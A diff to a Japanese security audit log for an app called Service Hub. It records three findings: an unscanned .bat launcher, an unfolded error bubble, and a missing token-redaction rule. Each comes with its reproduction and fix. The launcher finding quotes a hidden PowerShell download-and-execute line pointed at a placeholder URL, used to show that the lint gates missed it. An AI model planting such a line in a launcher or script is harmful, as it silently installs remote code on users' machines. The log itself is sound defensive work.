@@ -1,5 +1,42 @@
 # Service Hub — 残りの作業手順書
 
+## パス 516 (狩りの 6 回目 —— 5 面を監査役に並行で走らせ、確認した本物だけ直す) (2026-10-13)
+
+5 面 (main-ipc / renderer / network / ai / supply-chain) を監査役 (read-only・high) に並行で走らせ、**指摘を自分で再現してから**本物だけ直した。報告は main-ipc / renderer / ai = 0 件 (measured-healthy)、network = 新規 LOW 1 件、supply-chain = 新規 MEDIUM 1 件。ai 面は監査役を待つ間に自分で `ChatbotWidget` の invoke 失敗経路を読んで 1 件見つけた。再現で **3 件とも本物**と確認。
+
+### T-019 (供給網 → living-off-the-land・medium) —— 配る実行可能ランチャー `launcher/*.bat` が門・鎖・CODEOWNERS の外
+
+- **再現 (実測 2026-10-13・直す前)**: `launcher/ServiceHubを開く.bat` に `powershell -NoProfile -W Hidden -c "iwr <url> -OutFile $env:TEMP\x.exe; Start-Process $env:TEMP\x.exe"` の download-and-exec を 1 行足すと、`lint:malware` / `lint:forbidden` / `lint:shell` / `lint:charset` が **4 門すべて exit 0** (復元 md5 一致)。走査母集団・整合性チェーン・CODEOWNERS のどれにも `launcher` が無かった。
+- **門が見なかった理由**: `lint:malware` の `isScannedPath` と `lint:forbidden` の `SCAN_ROOTS` はトップレベル dir の**固定 allowlist** (`src|scripts|orchestration|build|assets`) で走査母集団を決めるので、新しいトップレベル dir `launcher/` を構造的に見ない (T-016 が直下ファイルで直した「固定→git ls-files 動的化」が dir レベルに残っていた)。`.bat` はどの `SCAN_EXTS` / `isWalkedSourceName` にも無い (T-018 の拡張子死角の家系)。
+- **到達可能性**: このランチャーは Windows 利用者が**ダブルクリックして** standalone.html を開くために在る (ファイル自身がそう設計)。署名鍵 (release.yml の Build) には届かず・Pages/release の自動配布物にも入らないので、victim 配布は『利用者がソースを取ってランチャーを実行する』場合に限る (= ランチャーの用途そのもの)。
+- **なぜ走査門ではなくチェーンか**: `.bat` は Windows シェルで、`lint:forbidden` (JS の形) も `lint:shell` (bash の形) の規則も当てはまらない。無理に走査門へ入れても PowerShell の download-and-exec は捕まらない。正しい機構は『黙った編集を可視化 + 所有者レビュー必須』 —— `assets/sw.js` や配る maker と同じく整合性チェーンの PROTECTED にする。CODEOWNERS 被覆は `threatLedger.test.ts` の T-003 検査が自動で要求する。
+- **直し**: `scripts/integrity-chain.cjs` の PROTECTED・`.github/CODEOWNERS` へ足し、`chain:append` で block **#290** を採掘。将来のランチャー (任意 dir・`.bat/.cmd/.ps1/.vbs/.command`) は `launcherExecutablesGuarded.test.ts` が `git ls-files` から走査して『全部チェーン保護対象』で機械強制する (`.sh` は `lint:shell` の担当なので除く —— 同じ事実を 2 門で見ない)。
+- **回帰**: `launcherExecutablesGuarded.test.ts`「★ 追跡された Windows シェルのランチャーはすべてチェーン保護対象 (threat: T-019)」+ 針の標本 (`launcher/not-in-chain.bat` → false・`assets/sw.js` → true)。
+
+### T-020 (renderer → ai-phishing・low) —— コンシェルジュの invoke 失敗の吹き出しが第三者の本文を畳まない
+
+- **再現 (実測 2026-10-13・直す前)**: `ChatbotWidget.runIntent:417` は `serviceHub.invoke` の失敗を `append({ role:'bot', text: `⚠ 実行に失敗しました: ${classified.message}` })` で描き、`externalTextOnOneLine` を通していなかった。jsdom で実物の経路 (発話 → 確認 → 実行) を通し、invoke に改行入りの失敗本文 (`トークンが不正です\n\n✅ 実行しました。…\n🛠 Slack で…`) を返させると、吹き出しの `textContent` に `\n` が残り、`✅ 実行しました…` が独立した行として描かれた (`.concierge-msg` は `white-space: pre-wrap`)。
+- **非対称**: 同じ吹き出しの Ollama エラー経路 `chatbotOllama.ts:116` は `externalTextOnOneLine(redactForMessage(...))` で畳んでいた (パス 511・T-005)。AI アシスタントの失敗の吹き出しもパス 488 で畳んでいた。invoke 失敗の経路**だけ**が畳んでいなかった。
+- **choke point との関係**: `classified.message` は browser の `err()` / main の `safeErrorMessage` が既に伏字と長さを掛けている。だが実測で `redactForMessage` は**改行を残す** (伏せてから切るだけ) ので、足りなかったのは**畳み**だけ。伏字 (T-021 と合わせ) と畳みの両方がこの経路に掛かる。
+- **直し**: `externalTextOnOneLine(classified.message)` で畳む (Ollama 兄弟と同じ)。`import { externalTextOnOneLine } from '../data/assistantMarkdown'`。
+- **回帰**: `chatbotInvokeFailureFold.test.ts` (4 件・jsdom で実物の経路)「★ 改行入りの失敗本文を 1 行に畳む (吹き出しに改行が残らない) (threat: T-020)」+ 文は消さない + U+202E を `\uXXXX` へ逃がす + 偽の成功行が別の吹き出しにならない。**対照**: `externalTextOnOneLine` を外すと `not.toContain('\n')` が落ちる (確認済)。
+
+### T-021 (network → ssrf-and-credential-egress・low) —— `redact.ts` に Cursor の `key_` が無く裸で素通り
+
+- **再現 (実測 2026-10-13・実物の `redactSecrets` を esbuild で束ねて走らせた)**: `{"error":"Invalid API key: key_9f2c1a8e4b7d6c5f0a3edead"}` は**素通り**・`Authorization: Bearer key_…` と `{"authorization":"Bearer key_…"}` は伏せた。`sk-ant-` / `ghp_` の裸形は伏せる (対照)。
+- **穴の由来**: cursor は `credentialUse.ts:128` で `fetch` (資格情報を預かる)・`api/cursor.ts:438` が `Authorization: Bearer <token>` で送り・`types.test.ts:259` が Cursor 風 TOKEN に `key_9f2c1a8e4b7d6c5f0a3e` (16 進) を使う = **発行元が分かる接頭辞を持つ形**。ところが `redactionCoverage.test.ts` の census は cursor を `header-only` に置き、標本を**実形でない** `'H'.repeat(40)` (接頭辞なし) にしていたので『裸では伏せられなくて正しい』と主張して**穴を隠していた** (パス 231 が塞いだ『自分の写しを数える』家系の再来)。
+- **到達可能性**: ブラウザ版の Cursor live-read は BYO proxy 経由 (`liveRead.ts` → `fetchViaProxy`)。`fetchViaProxy` の `!proxyRes.ok` 枝 (`proxy.ts`) はプロキシのエラー本文を `redactForMessage` に通して画面とバグ報告へ出す。乗っ取られた / 設定を誤った Worker が転送された `key_…` を**ヘッダ名を伴わない素の形**で反射すると伏字を通り抜ける (T-008 / パス 289 と同じ害 —— 利用者が公開の場に貼るバグ報告へトークンが混入)。
+- **直し**: `redact.ts` に `\bkey_[0-9a-f]{16,}` を足す。`key_` は散文に現れる接頭辞 (`key_press_handler` / `primary_key_constraint`) なので、上の `[A-Za-z0-9_-]` の一括規則に混ぜると散文を巻き込む。実物の鍵は 16 進なので `[0-9a-f]{16,}` に限れば巻き込まない (実測で散文 9 形が素通りすることを確認)。census の cursor 行を `carrier: prefix`・実形の標本 `key_9f2c1a8e4b7d6c5f0a3e` へ移した (`prefix` の検査が実形を裸で伏せられることを測る)。
+- **回帰**: `redactionCoverage.test.ts`「★ JSON のエラー本文に裸で反射された Cursor の鍵を伏せる (threat: T-021)」+ **対照**「散文の key_ は巻き込まない」(`key_press_handler` ほか 4 形は素通り)。
+
+### 0 件の 3 面 (main-ipc / renderer の XSS 系 / ai の他経路)
+
+監査役の報告: main-ipc (IPC 引数検証・shellOpenGate)・renderer (danger sinks・保存値の描画)・ai (書き込み確認の経路) は実測で健全。network の監査役が measured-healthy と報告した軸 (転送不追随・本文上限・SSRF 送り先・第三者応答由来の URL 組み立て・Ollama ホスト判定・AI provider 経路・Worker の 3 段 SSRF) は上の出荷物の節に実測つき。
+
+### 検証
+
+`typecheck` 緑・`npm test` **1057 ファイル / 21346 件**・`verify:all` exit 0 (ユニット数 17638 → **17647**・`redact.ts` の参照 drift 532-534 → 570-572)・`chain:verify` 緑 (block **#290**)。出荷コードが動いたので実機も: FULL **11,875,104 B** / LITE **3,287,728 B** (+3,016 B)・perf OK・`e2e` **758 件 ❌ 0**・`e2e:lite` **758 件 ❌ 0**。脅威 17 → **20** (T-004 欠番)。
+
 ## パス 515 (狩りの 5 回目 —— 5 面を監査役に並行で走らせ、確認した本物だけ直す) (2026-10-13)
 
 5 面 (main-ipc / renderer / network / ai / supply-chain) を監査役 (read-only・high) に並行で走らせ、**指摘を自分で再現してから**本物だけ直した。報告は main-ipc / renderer / ai / network = 0 件 (measured-healthy)、supply-chain = 新規 LOW 1 件 + latent な観察 2 件。再現で 2 件が本物と確認。
